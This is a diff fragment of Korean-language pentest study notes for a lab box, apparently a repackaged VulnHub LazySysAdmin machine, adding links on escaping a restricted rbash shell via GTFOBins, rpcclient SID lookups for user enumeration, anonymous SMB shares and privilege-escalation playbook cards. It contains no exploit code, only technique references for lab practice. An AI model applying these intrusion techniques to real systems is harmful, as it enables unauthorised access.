-- [[Sorcerer]] — 같은 "접속은 되는데 셸이 갇혀 있다" 부류. 저쪽은 `authorized_keys` 의 `command=` 강제 명령, 이쪽은 `/etc/passwd` 의 `rbash`. **로그인이 됐는데 뭔가 안 되면 셸 자체를 의심하라**는 반사가 같다.
+- GTFOBins — 제한 셸 탈출 참고: https://gtfobins.github.io/#+shell
+- `rpcclient` SID 네임스페이스: Samba 의 `S-1-22-1-<uid>` = Unix 사용자, `S-1-22-2-<gid>` = Unix 그룹
+- 이 박스는 VulnHub 의 LazySysAdmin 1.0 을 PG 가 재포장한 것 — 원판과 달리 `togie` 의 셸이 `/bin/rbash`, 플래그가 `local.txt`/`proof.txt` 로 바뀜
+- [[Sorcerer]] — 같은 "접속은 되는데 셸이 갇혀 있다" 부류. 저쪽은 `authorized_keys` 의 `command=` 강제 명령, 이쪽은 `/etc/passwd` 의 `rbash`
+- [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]] — `id` 의 보조 그룹을 `sudo -S -l` 재확인의 트리거로 쓴 사례
+- 이 박스의 시행착오·반사 카드 — [[_PLAYBOOK#A-36. 제한 셸(rbash)에 떨어졌다]] · [[_PLAYBOOK#A-37. rbash 대상에 `scp` 가 조용히 끊긴다]] · [[_PLAYBOOK#A-1-12. 「top-1000 밖이라 못 봤다」 — 예열 스캔의 «범위»부터 확인한다]] · MySQL 에러 1130/1045 구분은 [[_PLAYBOOK#A-24. 한 서비스의 거부는 자격증명의 오류가 아니다]] · WordPress 302/200 판정은 [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]] · `grep` 문맥 패턴 오판은 [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]]
+- 기법 카드 — [[_PLAYBOOK#B-27. 익명으로 열리는 SMB 공유 — `path` 가 웹루트인지부터 본다]] · [[_PLAYBOOK#B-28. `enum4linux -U` 가 비면 `rpcclient` 로 `S-1-22-1-<uid>` 를 역조회한다]]
 - [[_STATUS]] — 283개 전수 진행현황
